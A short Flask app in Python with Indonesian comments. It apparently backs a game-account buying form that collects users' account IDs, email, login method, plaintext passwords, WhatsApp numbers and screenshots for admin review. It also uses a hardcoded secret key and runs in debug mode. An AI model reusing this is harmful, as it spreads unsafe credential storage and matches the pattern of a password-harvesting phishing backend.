from flask import Flask, render_template, request, redirect, url_for, flash
import os
import csv
from werkzeug.utils import secure_filename
from database import save_user_data  # Pastikan ini ada

app = Flask(__name__)
app.config['UPLOAD_FOLDER'] = 'uploads/'
app.secret_key = "supersecretkey"  # Dibutuhkan untuk flash messages

# Buat folder upload jika belum ada
os.makedirs(app.config['UPLOAD_FOLDER'], exist_ok=True)

@app.route("/", methods=["GET", "POST"])
def index():
    if request.method == "POST":
        user_id = request.form["user_id"]
        server_id = request.form["server_id"]
        email = request.form["email"]
        login_method = request.form["login_method"]
        password = request.form["password"]
        whatsapp = request.form["whatsapp"]
        price_offer = request.form["price_offer"]  # Ambil harga yang diajukan

        # Handle file upload
        file_path = "No File"
        if "full_ss" in request.files:
            file = request.files["full_ss"]
            if file and file.filename:  # Pastikan file tidak kosong
                filename = secure_filename(file.filename)
                file_path = os.path.join(app.config["UPLOAD_FOLDER"], filename)
                file.save(file_path)

        # Simpan data ke CSV
        save_user_data(user_id, server_id, email, login_method, password, whatsapp, price_offer, file_path)

        # Tampilkan notifikasi ke user
        flash("Harap tunggu, akun sedang dicek admin!", "info")

        return redirect(url_for("index"))

    return render_template("index.html")

if __name__ == "__main__":
    app.run(debug=True)
